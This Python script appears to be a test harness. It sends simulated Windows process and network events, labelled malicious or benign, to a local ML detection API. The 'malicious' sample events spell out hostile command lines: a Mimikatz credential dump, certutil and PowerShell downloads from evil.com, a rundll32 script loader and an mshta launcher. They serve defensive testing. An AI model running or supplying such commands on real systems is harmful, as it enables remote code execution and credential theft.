"""
Attack Simulation Script for IR-Agent Testing
Generates test events to validate ML detection pipeline

WARNING: This script creates benign test events that mimic attack patterns.
For educational/testing purposes only.
"""
import requests
import time
import subprocess
import random
from datetime import datetime

API_URL = "http://localhost:9000/ingest/telemetry"

# Test events - mix of BENIGN and MALICIOUS patterns
TEST_EVENTS = [
    # MALICIOUS - should be detected
    {
        "event_type": "ProcessCreate",
        "event_id": 4688,
        "hostname": "TEST-PC",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAApACkA",
        "parent_image": "cmd.exe",
        "user": "TESTUSER",
        "description": "Base64 encoded PowerShell - SHOULD BE DETECTED"
    },
    {
        "event_type": "ProcessCreate",
        "event_id": 4688,
        "hostname": "TEST-PC",
        "process_name": "powershell.exe",
        "command_line": "powershell -w hidden Invoke-Mimikatz -DumpCreds",
        "parent_image": "cmd.exe",
        "user": "TESTUSER",
        "description": "Mimikatz invocation - SHOULD BE DETECTED"
    },
    {
        "event_type": "ProcessCreate",
        "event_id": 4688,
        "hostname": "TEST-PC",
        "process_name": "certutil.exe",
        "command_line": "certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe",
        "parent_image": "cmd.exe",
        "user": "TESTUSER",
        "description": "CertUtil download - SHOULD BE DETECTED"
    },
    {
        "event_type": "ProcessCreate",
        "event_id": 4688,
        "hostname": "TEST-PC",
        "process_name": "wmic.exe",
        "command_line": "wmic process call create 'powershell -nop -w hidden -c IEX(downloadstring(http://x.x.x.x))'",
        "parent_image": "cmd.exe",
        "user": "TESTUSER",
        "description": "WMIC process call with IEX - SHOULD BE DETECTED"
    },
    {
        "event_type": "ProcessCreate",
        "event_id": 4688,
        "hostname": "TEST-PC",
        "process_name": "rundll32.exe",
        "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();GetObject(\"script:http://evil.com/payload\")",
        "parent_image": "explorer.exe",
        "user": "TESTUSER",
        "description": "Rundll32 with JavaScript - SHOULD BE DETECTED"
    },
    # BENIGN - should be filtered
    {
        "event_type": "ProcessCreate",
        "event_id": 4688,
        "hostname": "TEST-PC",
        "process_name": "notepad.exe",
        "command_line": "notepad.exe C:\\Users\\test\\document.txt",
        "parent_image": "explorer.exe",
        "user": "TESTUSER",
        "description": "Normal notepad - SHOULD BE BENIGN"
    },
    {
        "event_type": "ProcessCreate",
        "event_id": 4688,
        "hostname": "TEST-PC",
        "process_name": "chrome.exe",
        "command_line": "chrome.exe --start-maximized",
        "parent_image": "explorer.exe",
        "user": "TESTUSER",
        "description": "Normal Chrome - SHOULD BE BENIGN"
    },
    {
        "event_type": "LogonSuccess",
        "event_id": 4624,
        "hostname": "TEST-PC",
        "user": "TESTUSER",
        "logon_type": "2",
        "source_ip": "",
        "description": "Interactive logon - SHOULD BE BENIGN"
    },
    {
        "event_type": "ProcessCreate",
        "event_id": 4688,
        "hostname": "TEST-PC",
        "process_name": "explorer.exe",
        "command_line": "C:\\Windows\\explorer.exe",
        "parent_image": "userinit.exe",
        "user": "TESTUSER",
        "description": "Normal explorer start - SHOULD BE BENIGN"
    },
    {
        "event_type": "ProcessCreate",
        "event_id": 4688,
        "hostname": "TEST-PC",
        "process_name": "svchost.exe",
        "command_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
        "parent_image": "services.exe",
        "user": "SYSTEM",
        "description": "Normal svchost - SHOULD BE BENIGN"
    },
    # More MALICIOUS patterns
    {
        "event_type": "ProcessCreate",
        "event_id": 4688,
        "hostname": "TEST-PC",
        "process_name": "powershell.exe",
        "command_line": "powershell -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\"",
        "parent_image": "cmd.exe",
        "user": "TESTUSER",
        "description": "PowerShell downloader - SHOULD BE DETECTED"
    },
    {
        "event_type": "ProcessCreate",
        "event_id": 4688,
        "hostname": "TEST-PC",
        "process_name": "mshta.exe",
        "command_line": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell\"\", 0\")",
        "parent_image": "explorer.exe",
        "user": "TESTUSER",
        "description": "MSHTA VBScript - SHOULD BE DETECTED"
    },
    {
        "event_type": "NetworkConnection",
        "event_id": 3,
        "hostname": "TEST-PC",
        "process_name": "powershell.exe",
        "destination_ip": "192.168.1.100",
        "destination_port": "4444",
        "user": "TESTUSER",
        "description": "PowerShell connection to C2 port - SHOULD BE DETECTED"
    },
]


def send_event(event: dict):
    """Send event to API"""
    event["timestamp"] = datetime.utcnow().isoformat() + "Z"
    try:
        response = requests.post(API_URL, json=event, timeout=5)
        return response.status_code == 200, response.json()
    except Exception as e:
        return False, str(e)


def run_simulation():
    """Run attack simulation"""
    print("=" * 70)
    print("IR-AGENT ATTACK SIMULATION")
    print("=" * 70)
    print(f"API: {API_URL}")
    print(f"Events to send: {len(TEST_EVENTS)}")
    print("-" * 70)

    # Check API health
    try:
        health = requests.get("http://localhost:9000/health", timeout=5)
        if health.status_code == 200:
            print("API: ONLINE")
        else:
            print("API: ERROR")
            return
    except:
        print("API: OFFLINE - Start the API first!")
        return

    print("-" * 70)

    results = {"sent": 0, "malicious_expected": 0, "benign_expected": 0}

    for i, event in enumerate(TEST_EVENTS, 1):
        desc = event.pop("description", "No description")
        expected = "MALICIOUS" if "SHOULD BE DETECTED" in desc else "BENIGN"

        if expected == "MALICIOUS":
            results["malicious_expected"] += 1
        else:
            results["benign_expected"] += 1

        success, response = send_event(event)

        status = "OK" if success else "FAIL"
        print(f"[{i:02d}] {status} | {expected:9} | {event.get('process_name', event.get('event_type', 'unknown'))}")

        if success:
            results["sent"] += 1

        time.sleep(0.3)  # Small delay between events

    print("-" * 70)
    print(f"Sent: {results['sent']}/{len(TEST_EVENTS)}")
    print(f"Expected MALICIOUS: {results['malicious_expected']}")
    print(f"Expected BENIGN: {results['benign_expected']}")
    print("-" * 70)

    # Wait for processing
    print("\nWaiting 3 seconds for ML processing...")
    time.sleep(3)

    # Check metrics
    try:
        metrics = requests.get("http://localhost:9000/ingest/metrics", timeout=5)
        if metrics.status_code == 200:
            data = metrics.json()
            ml_filter = data.get("ml_filter", {})
            print("\n" + "=" * 70)
            print("ML FILTER RESULTS")
            print("=" * 70)
            print(f"Total Processed: {ml_filter.get('total_processed', 0)}")
            print(f"Malicious Detected: {ml_filter.get('malicious_detected', 0)}")
            print(f"Benign Filtered: {ml_filter.get('benign_filtered', 0)}")
            print(f"Detection Rate: {ml_filter.get('detection_rate', '0%')}")
            print(f"Filter Rate: {ml_filter.get('filter_rate', '0%')}")
            print("-" * 70)

            bs = data.get("betterstack", {})
            print(f"Better Stack Enabled: {bs.get('enabled', False)}")
            print(f"Sent to Better Stack: {bs.get('sent', 0)}")
            print(f"Failed: {bs.get('failed', 0)}")
            print("=" * 70)
    except Exception as e:
        print(f"Error getting metrics: {e}")


def generate_real_windows_events():
    """Generate some real Windows events by running commands"""
    print("\n" + "=" * 70)
    print("GENERATING REAL WINDOWS EVENTS")
    print("=" * 70)
    print("Running benign commands to generate Event ID 4688...\n")

    commands = [
        ("dir", "Directory listing"),
        ("hostname", "Get hostname"),
        ("whoami", "Get current user"),
        ("ipconfig", "Network configuration"),
        ("tasklist", "Process list"),
    ]

    for cmd, desc in commands:
        print(f"Running: {cmd} ({desc})")
        try:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
            print(f"  Process created: Event ID 4688")
        except:
            print(f"  Error running command")
        time.sleep(0.5)

    print("\nReal events generated. Check Windows Event Viewer -> Security")


if __name__ == "__main__":
    print("\nIR-Agent Attack Simulation")
    print("1. Send test events to API (simulated attacks)")
    print("2. Generate real Windows events (benign commands)")
    print("3. Both")
    print()

    choice = input("Choose option (1/2/3): ").strip()

    if choice == "1":
        run_simulation()
    elif choice == "2":
        generate_real_windows_events()
    elif choice == "3":
        run_simulation()
        generate_real_windows_events()
    else:
        print("Running simulation by default...")
        run_simulation()
